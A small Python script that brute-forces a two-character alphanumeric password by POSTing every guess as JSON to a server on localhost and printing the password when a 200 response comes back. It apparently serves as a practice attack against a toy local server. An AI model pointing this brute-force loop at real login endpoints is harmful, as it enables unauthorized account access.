import string
import requests
import json

all_letters = string.ascii_letters + string.digits
all_ascii = []


def generate_all_ascii_chars(letters):
    cur_comb = ""
    found = False
    for c in letters:
        for d in letters:
            cur_comb = c + d
            all_ascii.append(cur_comb)
            print(hackerman_hackserver(cur_comb))
            if hackerman_hackserver(cur_comb) == 200:
                print("SUPER HACKED")
                print("PW:" + cur_comb)
                found = True
            if found:
                break
        if found:
            break
        print(all_ascii[len(all_ascii)-1])


def hackerman_hackserver(password):
    call = {}
    call['password'] = password
    headers = {'content-type': 'application/json'}
    r = requests.post('http://127.0.0.1:5000/', headers=headers, json=call)
    return r.status_code


def test_request():
    data = {}
    data['password'] = 'a9'
    headers = {'mimetype': 'application/json'}
    r = requests.post('http://127.0.0.1:5000/', headers=headers, json=data)
    print(r.status_code)

generate_all_ascii_chars(all_letters)
